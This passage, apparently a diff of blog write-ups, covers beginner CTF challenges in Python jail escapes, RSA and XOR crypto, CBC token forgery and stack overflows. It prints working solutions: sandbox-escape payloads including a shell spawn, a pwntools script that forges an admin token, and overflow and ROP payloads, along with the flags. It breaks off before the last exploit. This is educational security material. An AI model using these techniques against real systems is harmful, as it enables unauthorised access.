&#x27;os&#x27;, &#x27;=&#x27;, &#x27;txt&#x27;, &#x27;read&#x27;, &#x27;dict&#x27;, &#x27;;&#x27;, &#x27;:&#x27;, &#x27;\n&#x27;, &#x27;flag&#x27;, &#x27;subprocess&#x27;, &#x27;write&#x27;, &#x27;input&#x27;, &#x27;_&#x27;, &#x27;getattr&#x27;, &#x27;globals&#x27;, &#x27;update&#x27;]</span><br><span class="line"></span><br><span class="line">    for illegal in blacklist:</span><br><span class="line">        if illegal in userinput.lower():</span><br><span class="line">            print(&quot;Illegal Char: &quot; + illegal)</span><br><span class="line">            print(&quot;Goodbye :)&quot;)</span><br><span class="line">            raise Exception()</span><br><span class="line">    else:</span><br><span class="line">        exec(userinput)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>There is three intended solution for each of the qeustion, however there is also unintended solution</p>
+<h3 id="Intended-solution"><a href="#Intended-solution" class="headerlink" title="Intended solution"></a>Intended solution</h3><p>Pyjail 1: <code>__builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).__dict__[&#39;system&#39;](&#39;ls&#39;)</code></p>
+<p>Pyjail 2&amp;3: <code>print([l.strip() for l in open(&quot;f&quot;+&quot;lag.tx&quot;+&quot;t&quot;)])</code></p>
+<h3 id="Unintended-solution"><a href="#Unintended-solution" class="headerlink" title="Unintended solution"></a>Unintended solution</h3><p>enter <code>breakpoint()</code>, this will lead to you into a python console, then you can do what ever you want. For example, use <code>import os;os.system(&quot;/bin/sh&quot;)</code> to spawn a shell.</p>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><ul>
+<li>maple{welc0m3_to_the_w0rlD_oF_cod3_j4ilz}</li>
+<li>maple{pyth0n_0n3_lInerz_UwU}</li>
+<li>maple{Did_u_kn0w_that_d0lph1ns_sl33p_with_one_eye_open}</li>
+</ul>
+<hr>
+<h2 id="Hijacked"><a href="#Hijacked" class="headerlink" title="Hijacked"></a>Hijacked</h2><p>the problem give you an <code>wireshark.pcap</code> file. Load this file into wireshark. You will find 4 suspicious http request. 4 http request contains a list of three number. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">49.26391,-123.21524,94.38</span><br><span class="line">49.26392,-123.21460,94.09</span><br><span class="line">49.26390,-123.21343,92.47</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>looks very like latitude and longtitude, so put all the number into an excel and draw the graph (and horizontal flip) to get the flag</p>
+<p><img data-src="uploads/hijacked.png" alt="hijacked.png"></p>
+<p><strong>flag</strong>: MapLE{misc_bacon_from_outer_space}</p>
+<h1 id="0x5-Crypto"><a href="#0x5-Crypto" class="headerlink" title="0x5 Crypto"></a>0x5 Crypto</h1><p>honestly, I have no idea how crypto works before this ctf. This ctf kind of give me an expression about how crypto looks like.</p>
+<hr>
+<h2 id="Factor-Me"><a href="#Factor-Me" class="headerlink" title="Factor Me"></a>Factor Me</h2><p>a very typical RSA problem, use factordb to get p,q. And then decrypt the message</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># https://en.wikipedia.org/wiki/RSA_(cryptosystem)</span><br><span class="line">from Crypto.Util.number import bytes_to_long, getPrime, inverse,long_to_bytes</span><br><span class="line"></span><br><span class="line">p = 773368062113</span><br><span class="line">q = 827811871697</span><br><span class="line"></span><br><span class="line">N= 640203263008444282715761</span><br><span class="line">e= 65537</span><br><span class="line">ciphertext= 400260416204680499515181</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(pow(ciphertext, d, N))</span><br><span class="line">print(long_to_bytes(pow(ciphertext, d, N)))</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{f@cTor!ng}</p>
+<hr>
+<h2 id="Too-Large-to-Factor"><a href="#Too-Large-to-Factor" class="headerlink" title="Too Large to Factor"></a>Too Large to Factor</h2><p>according to goole, it is related to <strong>e &#x3D; 3</strong>, but i don&#39;t how it works, so i just copy paste a script from internet and get the flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import bytes_to_long, getPrime, inverse,long_to_bytes</span><br><span class="line"></span><br><span class="line">n = 85296113154028266649672161860329361439935266228905629388726013424103003229818805929348250297726228216361916145120272570744501496079735410949226284857146260962752588479499367910582240029329267295901611756016118582770290309132799890905930226231742595748717830957810354752447792103653956003395218828964428421661</span><br><span class="line">e = 3</span><br><span class="line">cipher_str = 121098269316542670291503874251201317814247329243208799383594138766421611605510707696480316724191110125699109139761891217594094151254743752917029528490060357300730222261644995695658612386816700954494942529833311406855562210279835749</span><br><span class="line"></span><br><span class="line">gs = gmpy2.mpz(cipher_str)</span><br><span class="line">gm = gmpy2.mpz(n)</span><br><span class="line">ge = gmpy2.mpz(e)</span><br><span class="line"></span><br><span class="line">root, exact = gmpy2.iroot(gs, ge)</span><br><span class="line">print(long_to_bytes(root))</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{d0n7_f0rg37_y0ur_p4dd1n9!}</p>
+<hr>
+<h2 id="Copilot-my-savior"><a href="#Copilot-my-savior" class="headerlink" title="Copilot my savior"></a>Copilot my savior</h2><p>the encryption is pretty simple, xor all the bytes with a key, which is one byte.</p>
+<p>So for decryption, just iterate all the possible one byte (from 0 to 255).</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># Thanks copilot!</span><br><span class="line">def encrypt(file, key):</span><br><span class="line">    f = open(file, &quot;r&quot;)</span><br><span class="line">    f_out =open(file + &quot;.enc&quot;, &quot;w&quot;)</span><br><span class="line">    for line in f:</span><br><span class="line">        for c in line:</span><br><span class="line">            f_out.write(chr(ord(c) ^ key))</span><br><span class="line">    f.close()</span><br><span class="line">    f_out.close()</span><br><span class="line"></span><br><span class="line">def decrypt(file):</span><br><span class="line">    content = &quot;&quot;</span><br><span class="line">    with open(file, &quot;r&quot;) as f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    print(len(content))</span><br><span class="line">    for key in range(256):</span><br><span class="line">        for c in content:</span><br><span class="line">            print(chr(ord(c) ^ key),end=&quot;&quot;)</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># encrypt(&quot;flag.txt&quot;, key)</span><br><span class="line">decrypt(&quot;flag.txt.enc&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{c0P1L07_b37R4Y3D_m3}</p>
+<hr>
+<h2 id="Blindfolded"><a href="#Blindfolded" class="headerlink" title="Blindfolded"></a>Blindfolded</h2><p>this is a quite interesting problem. </p>
+<p>There is very important rule here</p>
+<p>a % N + -a % N &#x3D;&#x3D; N</p>
+<p>so to get N, we can use (-1)^65537 &#x3D; -1, therefore, N should be (-1 % N) + (1 % N), therefore, we can use -1 to get N from the server</p>
+<p>and since the server only check for flag not -flag, we can let server to decrypt -flag for us</p>
+<p>and the flag should be N + (-flag)</p>
+<p>server.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import getPrime, bytes_to_long, inverse</span><br><span class="line">flag = b&quot;123123&quot;</span><br><span class="line"></span><br><span class="line">def encrypt(msg):</span><br><span class="line">	return pow(msg, e, N)</span><br><span class="line"></span><br><span class="line">def decrypt(msg):</span><br><span class="line">	return pow(msg, d, N)</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">N = p * q</span><br><span class="line">print(N)</span><br><span class="line">print(p)</span><br><span class="line">print(q)</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(d)</span><br><span class="line">encrypted_flag = encrypt(flag)</span><br><span class="line"></span><br><span class="line"># Check that decryption works properly</span><br><span class="line">assert(decrypt(encrypted_flag) == flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	while True:</span><br><span class="line">		try:</span><br><span class="line">			print(&quot;&quot;&quot;Here are your options:\n1) Encrypt a message\n2) Decrypt a message\n3) Get the encrypted flag&quot;&quot;&quot;)</span><br><span class="line">			option = int(input(&quot;&gt;&gt;&gt; &quot;))</span><br><span class="line">			if option == 1:</span><br><span class="line">				msg = int(input(&quot;&gt;&gt;&gt; &quot;))</span><br><span class="line">				print(encrypt(msg))</span><br><span class="line">			elif option == 2:</span><br><span class="line">				msg = int(input(&quot;&gt;&gt;&gt; &quot;))</span><br><span class="line">				if msg == encrypted_flag:</span><br><span class="line">					print(&quot;No cheating!&quot;)</span><br><span class="line">				else:</span><br><span class="line">					print(decrypt(msg))</span><br><span class="line">			elif option == 3:</span><br><span class="line">				print(encrypted_flag)</span><br><span class="line">		except ValueError:</span><br><span class="line">			print(&quot;Something unexpected happened, please try again!&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{d0nt_f0rg37_t0_h@sh!!}</p>
+<hr>
+<h2 id="Cut-and-paste"><a href="#Cut-and-paste" class="headerlink" title="Cut and paste"></a>Cut and paste</h2><p>looking at <a href="./uploads/cutandpaste_server.py">server.py</a>. I realize, i need to construct a payload with <code>admin:true</code>. But server ban <strong>admin</strong>, <strong>:</strong>, and <strong>,</strong>.</p>
+<p>But since the server encrypt data 1 block by 1 block. We can combine two different block together to get the correct payload</p>
+<p>so first use <code>user:AAAAAAAA,admin:false,passwd:true</code> and get last block which represent <code>:true</code></p>
+<p>Then, use <code>user:AAAAA,admin:false,passwd:true</code> and get first block which represent <code>user:AAAAA,admin</code></p>
+<p>finally, combine those two block and send back to server, which should be the encryption of <code>user:AAAAA,admin:true</code>. This satisfy the rule and give us the flag.</p>
+<hr>
+<h2 id="One-two-three"><a href="#One-two-three" class="headerlink" title="One two three"></a>One two three</h2><p>idk how to explain. please check out this <a target="_blank" rel="noopener" href="https://ubcctf.github.io/2021/08/beginner-crypto/">tutorial</a></p>
+<p>here is my solution</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">lines = []</span><br><span class="line"></span><br><span class="line">def score(result):</span><br><span class="line">    score = 0</span><br><span class="line">    for b in result:</span><br><span class="line">        if ord(&quot;A&quot;) &lt;=b &lt;= ord(&quot;Z&quot;) or ord(&quot;a&quot;) &lt;= b &lt;= ord(&quot;z&quot;):</span><br><span class="line">            score += 6</span><br><span class="line">            continue</span><br><span class="line">        if b == 32:</span><br><span class="line">            score += 5</span><br><span class="line">            continue</span><br><span class="line">        if 33 &lt;=b &lt;= 47:</span><br><span class="line">            score += 1</span><br><span class="line">            continue</span><br><span class="line">        if b&lt;= 31:</span><br><span class="line">            score -= 2</span><br><span class="line">        if b &gt; 127:</span><br><span class="line">            score -= 8</span><br><span class="line">    return score</span><br><span class="line"></span><br><span class="line">with open(&quot;secret.enc&quot;, &quot;r&quot;) as f:</span><br><span class="line">    lines = [bytes.fromhex(line.strip()) for line in f.readlines()]</span><br><span class="line"></span><br><span class="line">possible_key_bytes = [i for i in range(256)]</span><br><span class="line">max_score_key = [0 for i in range(128)]</span><br><span class="line"></span><br><span class="line">for key_index in range(128):</span><br><span class="line">    maxscore = -10000000</span><br><span class="line">    for key in possible_key_bytes:</span><br><span class="line">        encoded_bytes = [b[key_index] for b in lines if key_index &lt; len(b)]</span><br><span class="line">        s = score([x ^ key for x in encoded_bytes])</span><br><span class="line">        if s &gt; maxscore:</span><br><span class="line">            maxscore = s</span><br><span class="line">            max_score_key[key_index] = key</span><br><span class="line"></span><br><span class="line">for line in lines:</span><br><span class="line">    ba = bytearray(line)</span><br><span class="line">    key_index = 0</span><br><span class="line">    for i in range(len(ba)):</span><br><span class="line">        ba[i] = ba[i]^max_score_key[key_index]</span><br><span class="line">        key_index +=1</span><br><span class="line">    print(ba)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Propagation"><a href="#Propagation" class="headerlink" title="Propagation"></a>Propagation</h2><p>similar to cut and paste <a href="./uploads/propagation_server.py">server.py</a>, but instead of encrypt message block by block using same key. it xor with the previous block before encryption. This is a technique called <strong>Block chaining</strong></p>
+<p>the main idea here is since it allow us to enter IV, we can make our own string <code>AA:AA,admin:true</code> and xor it with it self, which result in <code>\x00 * 16</code>. </p>
+<p>once we send our payload to server, server will return the encryption, which is block[2] &#x3D; <code>encrypt(&quot;AA:AA,admin:true&quot;^&quot;AA:AA,admin:true&quot;^block[1])</code></p>
+<p>so, if we send <code>encrypt(&quot;AA:AA,admin:true&quot;^&quot;AA:AA,admin:true&quot;^block[1])</code> to the server with IV of <code>&quot;AA:AA,admin:true&quot;^block[1]</code>.</p>
+<p>The server will decrypt our payload by <code>decrypt(encrypt(&quot;AA:AA,admin:true&quot;^&quot;AA:AA,admin:true&quot;^block[1])) ^ &quot;AA:AA,admin:true&quot;^block[1] </code> </p>
+<p>which is <code>&quot;AA:AA,admin:true&quot;^&quot;AA:AA,admin:true&quot;^block[1] ^ &quot;AA:AA,admin:true&quot;^block[1]</code> &#x3D;&#x3D; <code>&quot;AA:AA,admin:true&quot;</code>. </p>
+<p>And therefore, we bypass the check.</p>
+<p>here is my solution</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line"># context.log_level = &#x27;debug&#x27; # uncomment to enable debugging</span><br><span class="line"># r = remote(&#x27;localhost&#x27;, 1337)</span><br><span class="line">r = remote(&#x27;challenges.ctf.maplebacon.org&#x27;, 32002)</span><br><span class="line"></span><br><span class="line">def register_user(username, password):</span><br><span class="line">    print(f&quot;[Client] Registering user: &#123;username&#125; | passwd: &#123;password&#125;&quot;)</span><br><span class="line">    r.sendline(b&quot;1&quot;)</span><br><span class="line">    r.recvuntil(b&quot;Input your username:&quot;)</span><br><span class="line">    r.sendline(username)</span><br><span class="line">    r.recvuntil(b&quot;Input your password:&quot;)</span><br><span class="line">    r.sendline(password)</span><br><span class="line">    debug_stuff = r.recvuntil(b&quot;Here&#x27;s&quot;).decode()</span><br><span class="line">    for line in debug_stuff.split(&quot;\n&quot;)[:-1]:</span><br><span class="line">        print(line)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(b&quot;when we add the login feature: &quot;)</span><br><span class="line">    token = r.recvline().decode()</span><br><span class="line">    ctxt, iv = token.split(&quot;,&quot;)</span><br><span class="line">    r.recvuntil(b&quot;&gt;&quot;)</span><br><span class="line">    return ctxt, iv</span><br><span class="line"></span><br><span class="line">def admin_login(ctxt, iv):</span><br><span class="line">    token = ctxt + &quot;,&quot; + iv</span><br><span class="line">    print(&quot;[Client] Attempting login&quot;)</span><br><span class="line">    r.sendline(b&quot;2&quot;)</span><br><span class="line">    r.recvuntil(b&quot;token: &quot;)</span><br><span class="line">    r.sendline(token.encode())</span><br><span class="line">    debug_stuff = r.recvuntil(b&quot;Wel&quot;).decode()</span><br><span class="line">    for line in debug_stuff.split(&quot;\n&quot;)[:-1]:</span><br><span class="line">        print(line)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(b&quot;&gt;&quot;)</span><br><span class="line"></span><br><span class="line">def xor(a,b):</span><br><span class="line">    assert len(a) == len(b)</span><br><span class="line">    return bytes([x ^ y for x,y in zip(a,b)])</span><br><span class="line"></span><br><span class="line">def xor_hex(a,b):</span><br><span class="line">    a,b = bytes.fromhex(a),bytes.fromhex(b)</span><br><span class="line">    return bytes([x ^ y for x,y in zip(a,b)]).hex()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Y encrypt</span><br><span class="line"># user:AAAAAAA,adm | in:false,passwd: | AA:AA,admin:true</span><br><span class="line"># Y[2] = en(&quot;AAAAA,admin:true&quot;^X[1]^N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mask = b&#x27;AA:AA,admin:true&#x27;</span><br><span class="line">payload1 = b&quot;AAAAAAA&quot;</span><br><span class="line">payload2 = b&#x27;AA:AA,admin:true&#x27;</span><br><span class="line">ctxt,iv = register_user(payload1,xor(payload2,mask))</span><br><span class="line">admin_login(ctxt[32*2:32*3],xor_hex(ctxt[32*1:32*2],mask.hex()))</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x6-PWN"><a href="#0x6-PWN" class="headerlink" title="0x6 PWN"></a>0x6 PWN</h1><h2 id="memowy-cowwuption"><a href="#memowy-cowwuption" class="headerlink" title="memowy cowwuption"></a>memowy cowwuption</h2><p>the exploits is very straight forward, fgets() will cause an overflow. So we can just overwrite id.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">void vuln() &#123;</span><br><span class="line">    char* name = malloc(64);</span><br><span class="line">    int* id = malloc(sizeof(int));</span><br><span class="line"></span><br><span class="line">    puts(&quot;Hello, what is your name?&quot;);</span><br><span class="line"></span><br><span class="line">    fgets(name, 0x64, stdin);</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; 64; i++) &#123;</span><br><span class="line">        if (name[i] == &#x27;\n&#x27;) &#123;</span><br><span class="line">            name[i] = &#x27;\0&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (*id == ADMIN_ID) &#123;</span><br><span class="line">        win();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;Sorry %s, your ID (%x) does not match the admin ID (%x)\n&quot;, name, *id, ADMIN_ID);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp.py </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    # 0x38: 0,</span><br><span class="line">    0x50: 0xdeadbeef,</span><br><span class="line">&#125;,filler=b&#x27;A&#x27;,length=0x64)</span><br><span class="line"></span><br><span class="line">io.sendafter(b&quot;Hello, what is your name?\n&quot;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{ovewwwiting_stack_vawiabwes}</p>
+<hr>
+<h2 id="wetuwn-addwess"><a href="#wetuwn-addwess" class="headerlink" title="wetuwn addwess"></a>wetuwn addwess</h2><p>check binary, No PIE enabled. So just overwrite RIP to win to get the flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">void win() &#123;</span><br><span class="line">    puts(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    alarm(60);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line"></span><br><span class="line">    char name[32];</span><br><span class="line"></span><br><span class="line">    FILE* flagfile = fopen(&quot;flag.txt&quot;, &quot;r&quot;);</span><br><span class="line"></span><br><span class="line">    if (flagfile == NULL) &#123;</span><br><span class="line">        puts(&quot;Error: could not read flag file&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fgets(flag, FLAG_LEN, flagfile);</span><br><span class="line"></span><br><span class="line">    puts(&quot;What&#x27;s your name?&quot;);</span><br><span class="line">    gets(name);</span><br><span class="line">    printf(&quot;Hello %s! Let&#x27;s go to %p\n&quot;, name, __builtin_return_address(0));</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">stack = flat(&#123;</span><br><span class="line">    0x30+8: 0x00401216,</span><br><span class="line">&#125;,filler=b&#x27;\x00&#x27;,length=0x40)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;What&#x27;s your name?&quot;, stack)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>flag</strong>: maple{r3turn_t0_w1n}</p>
+<hr>
+<h2 id="wetuwn-owiented-pwogwamming"><a href="#wetuwn-owiented-pwogwamming" class="headerlink" title="wetuwn owiented pwogwamming"></a>wetuwn owiented pwogwamming</h2><p>change vuln with corresponding rop chain</p>
+<ol>
+<li>ret - just want to ret</li>
+<li>A() - make uwu &#x3D; true</li>
+<li>B() - make owo &#x3D; true</li>
+<li>pop rdi,ret - put 0xdeadbeef into first parameter of the function</li>
+<li>0xdeadbeef</li>
+<li>C() - call A(0xdeadbeef) to make rawrxd &#x3D; true</li>
+<li>win() - get the flag</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">char flag[FLAG_LEN];</span><br><span class="line">bool rawrxd = false;</span><br><span class="line">bool uwu = false;</span><br><span class="line">bool owo = false;</span><br><span class="line"></span><br><span class="line">void win() &#123;</span><br><span class="line">    // print flag</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void A() &#123;</span><br><span class="line">    uwu = true;</span><br><span class="line">    puts(&quot;uwu&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void B() &#123;</span><br><span class="line">    if (uwu) &#123;</span><br><span class="line">        owo = true;</span><br><span class="line">        puts(&quot;owo&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void C(int secwet) &#123;</span><br><span class="line">    if (secwet == 0xdeadbeef) &#123;</span><br><span class="line">        rawrxd = true;</span><br><span class="line">        puts(&quot;rawrxd&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void vuln() &#123;</span><br><span class="line">    char input[100];</span><br><span class="line"></span><br><span class="line">    puts(&quot;uwu owo rawrxd&quot;);</span><br><span class="line">    fgets(input, 0x100, stdin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    alarm(60);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>my exp.py</p>
